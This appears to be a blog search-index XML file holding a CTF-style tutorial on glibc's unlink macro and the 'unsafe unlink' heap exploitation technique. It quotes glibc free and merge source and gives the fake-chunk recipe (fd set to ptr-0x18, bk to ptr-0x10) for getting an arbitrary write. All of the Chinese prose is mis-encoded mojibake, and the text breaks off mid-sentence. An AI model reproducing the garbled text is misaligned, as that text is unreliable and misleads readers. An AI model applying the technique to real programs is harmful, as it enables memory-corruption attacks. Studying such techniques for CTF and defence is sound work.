<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Unlinkè®²è§£ä»¥åŠæ¼æ´åˆ©ç”¨</title>
      <link href="/2025/04/27/Unsafe-Unlink/"/>
      <url>/2025/04/27/Unsafe-Unlink/</url>
      
        <content type="html"><![CDATA[<h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><h2 id="åŸºæœ¬æ¦‚å¿µï¼š"><a href="#åŸºæœ¬æ¦‚å¿µï¼š" class="headerlink" title="åŸºæœ¬æ¦‚å¿µï¼š"></a>åŸºæœ¬æ¦‚å¿µï¼š</h2><p>Unlink æŒ‡çš„æ˜¯GNU Cåº“ (glibc) ä¸­ç”¨äºç®¡ç†åŒå‘é“¾è¡¨çš„ä¸€ä¸ªå†…éƒ¨å®ï¼Œå®ƒåœ¨heapåˆ†é…å™¨ä¸­è´Ÿè´£å°†ç›¸é‚»çš„ç©ºé—² chunk åˆå¹¶ã€‚ æ—©æœŸç‰ˆæœ¬çš„ glibc æœªå¯¹è¿™ä¸€è¿‡ç¨‹åšä¸¥æ ¼çš„å®‰å…¨æ£€æŸ¥ï¼Œé€šè¿‡ä¼ªé€  fd å’Œ bk ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ unlink é˜¶æ®µå®ç°ä»»æ„å†™ï¼Œä»è€Œè¾¾åˆ°ä»£ç æ‰§è¡Œï¼ˆâ€œUnsafe Unlinkâ€ï¼‰çš„æ•ˆæœï¼Œåæ¥ glibc åœ¨ 2.3.4 ç‰ˆæœ¬ä¸­å¼•å…¥äº† â€œsafe unlinkâ€æœºåˆ¶ ï¼Œ å¹¶åœ¨æ›´é«˜ç‰ˆæœ¬ä¸­é€šè¿‡â€œSafe-Linkingâ€è¿›ä¸€æ­¥åŠ å¼ºäº†å¯¹é“¾è¡¨æŒ‡é’ˆçº‚æ”¹çš„é˜²å¾¡ã€‚</p><h3 id="Unlink-çš„è§¦å‘å¼€å…³ï¼š"><a href="#Unlink-çš„è§¦å‘å¼€å…³ï¼š" class="headerlink" title="Unlink çš„è§¦å‘å¼€å…³ï¼š"></a>Unlink çš„è§¦å‘å¼€å…³ï¼š</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD)</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> _int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line"><span class="built_in">free</span>()&#123;</span><br><span class="line">_int_free()&#123;</span><br><span class="line">unlink();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æ‰§è¡Œ freeï¼ˆï¼‰ å‡½æ•°çš„æ—¶å€™ï¼Œè°ƒç”¨äº† _int_free() å‡½æ•° ï¼Œ_int_free()å‡½æ•°å†…éƒ¨å­˜åœ¨ unlink å®ã€‚</p><h3 id="Unlink-åœ¨-glibc-ä¸­çš„ä½œç”¨ï¼š"><a href="#Unlink-åœ¨-glibc-ä¸­çš„ä½œç”¨ï¼š" class="headerlink" title="Unlink åœ¨ glibc ä¸­çš„ä½œç”¨ï¼š"></a>Unlink åœ¨ glibc ä¸­çš„ä½œç”¨ï¼š</h3><ul><li>åŒå‘é“¾è¡¨ä¸­çš„èŠ‚ç‚¹åˆ é™¤ï¼ˆè„±é“¾ï¼‰</li></ul><p><u>å½“ä¸€ä¸ª chunk ä»æŸä¸€ä¸ª binï¼ˆåŒå‘é“¾è¡¨ï¼‰ä¸­è¢«ç§»é™¤ä»¥ä¾¿åˆå¹¶æ—¶</u>ï¼Œglibc ä¼šè°ƒç”¨ unlink ( ) å®ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    FD = P-&gt;fd;      </span><br><span class="line">    BK = P-&gt;bk;      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">    <span class="keyword">else</span> &#123;      </span><br><span class="line">        FD-&gt;bk = BK;      </span><br><span class="line">        BK-&gt;fd = FD;      </span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)      </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)      </span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">      malloc_printerr (check_action,      </span><br><span class="line">       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    </span><br><span class="line">       P, AV);      </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;      </span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      </span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      </span><br><span class="line">                <span class="keyword">else</span> &#123;      </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      </span><br><span class="line">                  &#125;      </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;      </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      </span><br><span class="line">              &#125;      </span><br><span class="line">          &#125;      </span><br><span class="line">      &#125;      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶å®è¿™ä¸ªæºç åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ä¸€ä¸ªå°±æ˜¯ small bin ä¸­çš„ unlink ï¼Œå¦ä¸€ä¸ªå°±æ˜¯ large bin ä¸­çš„unlink ã€‚</p><p>æˆ‘ä»¬æ¥åˆ†æ small bin ä¸­çš„ unlink ï¼Œæå–å‡ºå¯¹åº”éƒ¨åˆ†çš„æºç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    FD = P-&gt;fd;      </span><br><span class="line">    BK = P-&gt;bk;      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">    <span class="keyword">else</span> &#123;      </span><br><span class="line">        FD-&gt;bk = BK;      </span><br><span class="line">        BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure><p>P å°±æ˜¯æˆ‘ä»¬å‡†å¤‡unlinkçš„å †å—ï¼Œåœ¨è¿›è¡Œunlinkæ“ä½œä¹‹å‰ï¼Œä¸ºäº†ä¾¿äºç†è§£ï¼Œæˆ‘ä¼šç»“åˆå›¾ç‰‡è¿›è¡Œè®²è§£ï¼š</p><p>Part1 ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD = P-&gt;fd;      </span><br><span class="line">BK = P-&gt;bk;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€éƒ¨åˆ†çš„ä»£ç å…¶å®å°±æ˜¯å®šä¹‰ FDä¸º P çš„å‰ç©ºé—²å—ï¼ŒBKä¸º P çš„åç©ºé—²å—ï¼Œäºæ˜¯å°±å‡ºç°äº†ä»¥ä¸‹å›¾ç¤ºçš„ç»“æ„ã€‚</p><p><img src="/../PWN/Unlink/1.png" alt="image-20250427171112411"></p><p>Part2 ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      </span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV); </span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ unlink ä¸€ä¸ªæ£€æŸ¥æœºåˆ¶ ï¼Œ ä½¿ç”¨ if å‡½æ•°æ¥è¿›è¡Œæ£€æŸ¥ ï¼Œå¦‚æœæ£€æŸ¥æœ‰é—®é¢˜å°±ä¼šè§¦å‘ â€œcorrupted double-linked list â€ è­¦å‘Š ï¼Œå…¶å®æ£€æŸ¥çš„å†…å®¹ä¹Ÿéå¸¸çš„ç®€å• ï¼Œå°±æ˜¯åˆ¤æ–­ FD çš„ bk æ˜¯ä¸æ˜¯ P ï¼Œä»¥åŠåˆ¤æ–­ BK çš„ fd æ˜¯ä¸æ˜¯ P ï¼ŒPart1 è§†å›¾çš„çº¢çº¿éƒ¨åˆ†å°±æ˜¯æˆ‘ä»¬è¦æ£€æŸ¥çš„åœ°æ–¹ ï¼Œ ä¸¤æ ¹çº¢çº¿å¿…é¡»æŒ‡å‘ P å†…å­˜å— ã€‚</p><p>Part3 ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk = BK;      </span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure><p>å‡å®šç¨‹åºæ²¡æœ‰å‡ºç°é—®é¢˜ ï¼Œé‚£ä¹ˆæ­å–œä½  ï¼ŒæˆåŠŸè¿›å…¥äº† unlink çš„å…³é”®ä¸€æ­¥ ã€‚</p><p>æºä»£ç ä¹Ÿå¾ˆç®€å• ï¼Œæ— éå°±æ˜¯æŠŠ FD çš„ bk æŒ‡å‘äº† BK ï¼Œ æŠŠ Bk çš„ fd æŒ‡å‘äº† FD ï¼Œä¹Ÿå°±æ˜¯è¯´ part1 çº¢çº¿çš„æŒ‡å‘å‘ç”Ÿäº†æ”¹å˜ï¼Œä¸¤æ¡çº¢çº¿ä¸åœ¨æŒ‡å‘ P å†…å­˜å— ï¼Œ è€Œæ˜¯äº’ç›¸æŒ‡å‘äº†å¯¹æ–¹ ï¼Œ è¿™æ · P å†…å­˜å—å°±ä¼šå®ç° unlink æ“ä½œ ï¼Œ æˆåŠŸè„±ç¦»å‡ºæ¥ï¼Œæ”¹å˜åçš„ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="/../PWN/Unlink/2.png" alt="image-20250427172655039"></p><p>è¿™æ ·æ¯”è¾ƒéš¾çœ‹ ï¼Œæˆ‘ä»¬åœ¨ç®€åŒ–ä¸€ä¸‹ ï¼š</p><p><img src="/../PWN/Unlink/3.png" alt="image-20250427173650021"></p><p>ç°åœ¨çš„ P å·²ç»è„±ç¦»å‡ºæ¥äº† ï¼Œä»¥ä¸Šå°±æ˜¯ Unlink çš„ç›¸å…³æ“ä½œ ã€‚</p><h1 id="åˆå¹¶ç›¸é‚»å †å—æ—¶ç”¨åˆ°Unlinkï¼š"><a href="#åˆå¹¶ç›¸é‚»å †å—æ—¶ç”¨åˆ°Unlinkï¼š" class="headerlink" title="åˆå¹¶ç›¸é‚»å †å—æ—¶ç”¨åˆ°Unlinkï¼š"></a>åˆå¹¶ç›¸é‚»å †å—æ—¶ç”¨åˆ°Unlinkï¼š</h1><p>ç©ºé—²å †å—åˆå¹¶åˆ†ä¸ºå‘å‰åˆå¹¶å’Œå‘ååˆå¹¶ä¸¤ç§æƒ…å†µ ã€‚</p><p><img src="/../PWN/Unlink/4.png" alt="image-20250427203008314"></p><h2 id="å‘ååˆå¹¶ï¼š"><a href="#å‘ååˆå¹¶ï¼š" class="headerlink" title="å‘ååˆå¹¶ï¼š"></a>å‘ååˆå¹¶ï¼š</h2><p>å‡è®¾chunk1å·²ç»è¢«freeæ‰äº†ï¼Œchunk2å°†è¦è¢«free ï¼Œè¿™æ—¶åªè¦chunk2ä¹Ÿè¢«freeæ‰ ï¼Œå°±ä¼šè§¦å‘ç©ºé—²å †å—å‘ååˆå¹¶ï¼Œç›¸å…³æºç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!c</span><br><span class="line">    <span class="title function_">if</span> <span class="params">(!prev_inuse(p))</span> &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">  size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize)); </span><br><span class="line">      unlink(p, bck, fwd);</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªæ£€æŸ¥ï¼Œæ£€æŸ¥ p çš„ prev_inuse ä½ ï¼Œpre_inuse ä¸º 0 æ—¶ï¼Œåˆ™æ‰§è¡Œ if è¯­å¥é‡Œé¢çš„å†…å®¹ï¼Œprev_inuse ç®€ç§° P ä½ ï¼Œç”¨æ¥è¡¨ç¤ºå‰é¢çš„å †å—æ˜¯å¦å·²ç»è¢«åˆ†é…ï¼Œprev_inuse ä¸º 1 çš„æ—¶å€™ï¼Œä»£è¡¨å‰é¢çš„å †å—å·²ç»è¢«åˆ†é…ï¼Œè¿™ä¸ªæ—¶å€™ä¸èƒ½ä¸ä¹‹å‘ç”Ÿåˆå¹¶ï¼Œæ‰€ä»¥åªæœ‰å°†pre_inuseä½è®¾ç½®ä¸º 0 çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ‰èƒ½è¿›è¡Œå‘å‰åˆå¹¶çš„æ“ä½œ ã€‚</p><p>æˆ‘ä»¬æŠŠè¿™é‡Œçš„ P çœ‹ä½œæ˜¯ chunk2 ï¼Œå› ä¸º chunk1 å±äºç©ºé—²çŠ¶æ€ ï¼Œæ‰€ä»¥ chunk2 çš„ prev_inuse ä½è‚¯å®šæ˜¯ä¸º 0 çš„ï¼Œäºæ˜¯æˆ‘ä»¬å°±è¿›å…¥äº† if è¯­å¥ï¼Œæ‰§è¡Œé‡Œé¢çš„å†…å®¹ï¼Œæˆ‘ä»¬æ¥ä¸€å¥ä¸€å¥åˆ†æï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">prevsize = p-&gt;prev_size;</span><br></pre></td></tr></table></figure><p>å…ˆä»¤ prevsize ç­‰äº chunk2çš„prev_sizeä¹Ÿå°±æ˜¯ chunk1 çš„å¤§å°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">size += prevsize;</span><br></pre></td></tr></table></figure><p>å°† size çš„å€¼åŠ ä¸Š chunk1 çš„å¤§å° ï¼Œç°åœ¨çš„ size å·²ç»æ˜¯ chunk1 + chunk2 çš„å¤§å°äº†</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize)); </span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯ä¿®æ”¹ chunk2 çš„æŒ‡é’ˆ ï¼ŒæŠŠ chunk2 çš„æŒ‡é’ˆè®¾ç½®ä¸º chunk1ï¼Œç°åœ¨ chunk1 å’Œ chunk2 å½»åº•åˆå¹¶äº† ï¼Œå®ƒä»¬å˜æˆäº†å¦‚ä¸‹ç»“æ„ï¼š</p><p><img src="/../PWN/Unlink/5.png" alt="image-20250427211051172"></p><p>æ€»è€Œè¨€ä¹‹ ï¼Œchunk1 å’Œ chunk2 åˆå¹¶æˆäº†ä¸€ä¸ªä»¥ chunk1 ä¸ºæŒ‡é’ˆçš„æ›´å¤§çš„å †å—ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unlink(p, bck, fwd);</span><br></pre></td></tr></table></figure><p>åˆå¹¶æœ€åä¸€æ­¥å°±ä¼šæŠŠåˆå¹¶åçš„ chunk1 æ‹¿å» unlink ï¼Œæœ€åå†æ”¾å› unsorted bin é‡Œé¢<u>ï¼ˆä¸ªäººç†è§£ unlink çš„æœ¬è´¨å…¶å®å°±æ˜¯åˆ·æ–° Bin ï¼Œå½“ä¸¤ä¸ªç©ºé—²å †å—è¿›è¡Œåˆå¹¶çš„æ—¶å€™ï¼Œå…¶å¤§å°è‚¯å®šä¼šå‘ç”Ÿå˜åŒ–ï¼Œæ‰€ä»¥éœ€è¦unlinkæŠŠç©ºé—²å †å—ä»åŸå…ˆçš„chunké“¾ä¸­æ‹¿å‡ºæ¥ï¼ŒæŒ‰ç…§å¤§å°é‡æ–°æ”¾å…¥åˆé€‚çš„ Bin ä¸­ï¼‰</u></p><h2 id="å‘å‰åˆå¹¶ï¼š"><a href="#å‘å‰åˆå¹¶ï¼š" class="headerlink" title="å‘å‰åˆå¹¶ï¼š"></a>å‘å‰åˆå¹¶ï¼š</h2><p>ç°åœ¨å‡è®¾chunk1å·²ç»è¢«freeæ‰äº†ï¼Œchunk0å°†è¦è¢«free ï¼Œè¿™æ—¶åªè¦chunk0ä¹Ÿè¢«freeæ‰ ï¼Œå°±ä¼šè§¦å‘ç©ºé—²å †å—å‘å‰åˆå¹¶ï¼Œç›¸å…³æºç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!c</span><br><span class="line">â€¦â€¦</span><br><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line">â€¦â€¦</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line">â€¦â€¦</span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123; </span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123; </span><br><span class="line">            unlink(nextchunk, bck, fwd); </span><br><span class="line">          size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">            clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);    </span><br><span class="line"></span><br><span class="line">      â€¦â€¦</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¾æ—§æŠŠæºç æ‹†è§£åˆ†æï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br></pre></td></tr></table></figure><p>å°† nextchunk è®¾ç½®ä¸º chunk1ï¼Œå°† nextsize è®¾ç½®ä¸º chunk1 çš„ sizeï¼Œç°åœ¨çš„ nextchunk å°±ä»£è¡¨äº† chunk1</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top)</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªæ£€æŸ¥ ï¼Œåˆ¤æ–­ nextchunk æ˜¯å¦ä¸º topchunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"><span class="keyword">if</span> (!nextinuse) </span><br></pre></td></tr></table></figure><p>æŠŠ nextinuse è®¾ç½®ä¸º chunk2 çš„ P ä½</p><p>è¿™é‡Œæ˜¯åˆ¤æ–­ chunk2 çš„ P ä½æ˜¯å¦ä¸º 0 ï¼Œä¸º 0 ä»£è¡¨ chunk1 å¯ä»¥è¿›è¡Œåˆå¹¶ï¼Œç„¶åæˆ‘ä»¬å°±è¿›å…¥ if è¯­å¥</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unlink(nextchunk, bck, fwd);</span><br><span class="line">size += nextsize;</span><br></pre></td></tr></table></figure><p>å…ˆè¿›è¡Œ unlink æ“ä½œ ï¼ŒæŠŠ chunk1 ä»æ‰€åœ¨çš„ ç©ºé—²chunké“¾è¡¨ä¸­å–å‡ºæ¥ï¼Œç„¶åå°† chunk0 å’Œ chunk1 è¿›è¡Œåˆå¹¶ï¼Œsize ä¸º chunk0 + chunk1 çš„æ€»å¤§å°ï¼Œæ­¤æ—¶çš„ä¸¤ä¸ªchunkå·²ç»å®Œå…¨åˆå¹¶äº† ï¼Œåˆå¹¶å®Œçš„å †å—ä¼šæ ¹æ®å¤§å°æ”¾å…¥åˆ°åˆé€‚çš„ Bin ä¸­ ã€‚</p><p>å‘å‰åˆå¹¶å’Œå‘ååˆå¹¶çš„ä¸»è¦åŒºåˆ«åœ¨äºï¼š</p><ol><li>å‘å‰åˆå¹¶æ˜¯å…ˆunlinkååˆå¹¶ï¼Œå‘ååˆå¹¶æ˜¯å…ˆåˆå¹¶åunlink</li><li>å‘å‰åˆå¹¶ä¸éœ€è¦æ”¹å˜æŒ‡é’ˆï¼Œå‘ååˆå¹¶éœ€è¦æ”¹å˜æŒ‡é’ˆ</li></ol><p>å‘å‰åˆå¹¶åçš„ç»“æ„å˜åŒ–ï¼š</p><p><img src="/../PWN/Unlink/6.png" alt="image-20250427214528784"></p><h1 id="Unlinkæ‰‹æ³•çš„åˆ©ç”¨ï¼š"><a href="#Unlinkæ‰‹æ³•çš„åˆ©ç”¨ï¼š" class="headerlink" title="Unlinkæ‰‹æ³•çš„åˆ©ç”¨ï¼š"></a>Unlinkæ‰‹æ³•çš„åˆ©ç”¨ï¼š</h1><p>åŸç†ï¼šé€šè¿‡ä¼ªé€ å †å— fd å’Œ bk æŒ‡é’ˆ ï¼ŒåŒæ—¶ç»•è¿‡ç›¸åº”çš„æ£€æŸ¥ï¼Œå°±å¯ä»¥è¾¾åˆ°ä»»æ„åœ°å€å†™çš„ç›®çš„ ã€‚</p><p>æ¡ä»¶ï¼š</p><ol><li>UAFï¼Œå¯ä»¥ä¿®æ”¹ free çŠ¶æ€ä¸‹çš„ small bin æˆ–æ˜¯ unsorted bin çš„ fd å’Œ bk æŒ‡é’ˆ ã€‚</li><li><u>å·²çŸ¥ä½ç½®å­˜åœ¨ä¸€ä¸ªæŒ‡é’ˆ</u>æŒ‡å‘å¯ä»¥è¿›è¡Œ UAF çš„ chunk ã€‚</li></ol><p>æ€è·¯ï¼šè®¾æŒ‡å‘ UAF chunk çš„æŒ‡é’ˆçš„åœ°å€ä¸º ptr </p><ol><li>ä¿®æ”¹ fd ä¸º ptr - 0x18</li><li>ä¿®æ”¹ bk ä¸º ptr - 0x10</li><li>è§¦å‘ unlink</li></ol><p>ptr å¤„çš„æŒ‡é’ˆä¼šå˜ä¸º ptr - 0x18 ã€‚</p><p>å…¶ä¸­ä½ ä¹Ÿè®¸è¿˜ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¦ä½¿ç”¨è¿™ä¸ªæ€è·¯ ï¼Œæ¥ä¸‹æ¥æˆ‘ä¼šæ…¢æ…¢è·Ÿä½ è®²è§£ ã€‚</p><h2 id="æ€è·¯è®²è§£ï¼š"><a href="#æ€è·¯è®²è§£ï¼š" class="headerlink" title="æ€è·¯è®²è§£ï¼š"></a>æ€è·¯è®²è§£ï¼š</h2><p>é¦–å…ˆæˆ‘ä»¬è¦çŸ¥é“æƒ³è¦å¯¹ unlink æœºåˆ¶è¿›è¡Œä¸€ä¸ªéæ³•åˆ©ç”¨ï¼Œè¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ç›®çš„ ï¼Œ æˆ‘ä»¬å°±éœ€è¦ç»•è¿‡ç›¸åº”çš„æ£€æŸ¥æœºåˆ¶ ï¼Œè¿™é‡Œæˆ‘æŠŠä¸ unlink æ£€æŸ¥æœºåˆ¶ç›¸å…³çš„æºç æå–å‡ºæ¥ï¼ˆè¿™é‡Œå°±æ‹¿å‘ååˆå¹¶unlinkä½œä¸ºåˆ†æï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p))</span><br></pre></td></tr></table></figure><p>æ£€æŸ¥ä¸€ ï¼šæ£€æŸ¥ UAF chunk åç½®å †å— P ä½æ˜¯å¦ä¸º 0 ï¼Œä¸º 0 æ‰ä¼šè¿›è¡Œåˆå¹¶ ã€‚</p><p>æ£€æŸ¥ä¸€æ˜¯é’ˆå¯¹æˆ‘ä»¬éœ€è¦ä¼ªé€ çš„chunkçš„ä¸‹ä¸€ä¸ªchunkï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦ä¼ªé€ ä¸¤ä¸ªä¸œè¥¿ ï¼š</p><ul><li>prev_size åº”ç­‰äº fake_chunk çš„å®é™…å¤§å° </li><li>size çš„ P ä½ä¸º 0</li></ul><p>è¿™ä¸¤ä¸ªæ¡ä»¶åŒæ—¶æ»¡è¶³ ï¼Œ å°±ä»£è¡¨ fake_chunk ä¸º free çŠ¶æ€ ï¼Œè¿™æ ·æ‰èƒ½è¿›å…¥ unlink ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      </span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure><p>æ£€æŸ¥äºŒ ï¼šæ£€æŸ¥ä¼ªé€ å †å—çš„ fd å’Œ bk æŒ‡é’ˆ ï¼Œçœ‹çœ‹æˆ‘ä»¬éœ€è¦ unlink çš„å †å—çš„ fd å’Œ bk æ˜¯å¦æŒ‡å‘æ‰€åœ¨ Bin çš„ chunk é“¾çš„ FD å’Œ BKï¼ˆå‰ç©ºé—²å †å—å’Œåç©ºé—²å †å—ï¼‰ã€‚</p><p>å…¶å®åˆ°è¿™é‡Œå¯ä»¥å‘ç° ï¼Œæˆ‘ä»¬åœ¨ä¸Šé¢è§£é¢˜æ€è·¯ä¸­æåˆ°è¿‡çš„ä¿®æ”¹ fd å’Œ bk ï¼Œå…¶å®å°±æ˜¯ä¸ºäº†ä¼ªé€  fd å’Œ bk æŒ‡é’ˆ ï¼Œ ä½¿å…¶ç»•è¿‡ <u>æ£€æŸ¥äºŒ</u> ï¼ŒæˆåŠŸä»ç©ºé—²é“¾è¡¨ä¸­ unlink å‡ºæ¥ï¼ˆæˆ‘ä»¬éœ€è¦çŸ¥é“å½“æˆ‘ä»¬æƒ³è¦éæ³•åˆ©ç”¨unlinkçš„æ—¶å€™ï¼Œåˆå¹¶unlinkçš„ç›®çš„ä¸åœ¨äºåˆå¹¶ï¼Œè€Œæ˜¯unlinkè¿™ä¸ªè¿‡ç¨‹éœ€è¦freeåˆå¹¶è§¦å‘ï¼‰</p><p><strong><u>é‚£ä¸ºä»€ä¹ˆæˆ‘ä»¬è¦è¿™æ ·è¿›è¡Œä¼ªé€  fd å’Œ bk å‘¢ï¼Ÿ</u></strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p><img src="/../PWN/Unlink/7.png" alt="image-20250428150621525"></p><p>å‰æ–‡è¯´è¿‡ ï¼Œè¿™ä¸¤ä¸ªæ£€æŸ¥å…¶å®å°±æ˜¯çº¢çº¿éƒ¨åˆ† ï¼Œåœ¨ éæ³•unlink åœºæ™¯ä¸­æˆ‘ä»¬å…¶å®æ˜¯æ²¡æœ‰ FD  â†’ fake_chunk â†’ BK ï¼Œè¿™æ ·çš„ chunk é“¾çš„ ï¼Œæ‰€ä»¥å°±éœ€è¦æˆ‘ä»¬ä¼ªé€  FD å’Œ BK ï¼Œå¯ä»¥è¯´ï¼Œè¿™ä¸ª unlink çš„åœºæ™¯ä»å¤´åˆ°å°¾éƒ½æ˜¯éœ€è¦æˆ‘ä»¬å»ä¼ªé€ çš„ ï¼Œæˆ‘ä»¬è¦åˆ›é€ ä¸€ä¸ªæ»¡è¶³æ‰€æœ‰éœ€æ±‚ï¼Œç»•è¿‡æ‰€æœ‰æ£€æŸ¥çš„ BK ã€fake_chunk ã€FD è¿™æ ·çš„ chunk é“¾ ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">P-&gt;fd-&gt;bk == P &lt;=&gt; *(P-&gt;fd + <span class="number">0x18</span>) == P</span><br><span class="line">p-&gt;bk-&gt;fd == P &lt;=&gt; *(p-&gt;bk + <span class="number">0x10</span>) == P</span><br></pre></td></tr></table></figure><p>FD ã€BK æ˜¯æ ¹æ® fake_chunk çš„ fd ã€bk è¿›è¡Œä¼ªé€ çš„ ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åšåˆ°ä¸Šé¢è¿™ä¸ªæ¡ä»¶ ï¼Œå¦‚æœçœ‹èµ·æ¥è¿˜æ˜¯æ¯”è¾ƒç»•çš„è¯ ï¼Œå¯ä»¥çœ‹çœ‹ä¸‹é¢è¿™å¼ å›¾ ï¼š</p><p><img src="/../PWN/Unlink/8.png" alt="image-20250428152914934"></p><p>fake_chunk çš„ fd å°±æ˜¯æˆ‘ä»¬åˆ›é€ å‡ºæ¥çš„ fake_FD çš„é¦–åœ°å€ ï¼Œæˆ‘ä»¬è¦ä½¿å®ƒçš„ bk æ»¡è¶³çº¢çº¿çš„æ¡ä»¶ ï¼Œ å°±å¿…é¡»è®© fake_FD çš„é¦–åœ°å€ç­‰äº fake_chunk - 0x18 , å› ä¸º fake_FD çš„ bk è·ç¦»é¦–åœ°å€æœ‰ 0x18 çš„è·ç¦» ï¼Œå¦‚æœ fake_chunk çš„é¦–åœ°å€ç­‰äº fake_chunk - 0x18 çš„è¯ ï¼Œé‚£ä¹ˆ fake_FD çš„ bk å°±ç­‰äº fake_chunk - 